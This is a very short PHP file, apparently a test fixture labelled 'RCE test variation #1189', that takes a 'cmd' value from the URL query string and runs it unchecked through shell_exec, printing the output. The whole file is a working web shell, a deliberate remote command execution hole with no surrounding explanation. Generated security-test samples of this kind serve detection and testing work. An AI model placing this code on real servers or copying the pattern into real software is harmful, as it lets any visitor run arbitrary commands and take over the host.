<?php
// RCE test variation #1189
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>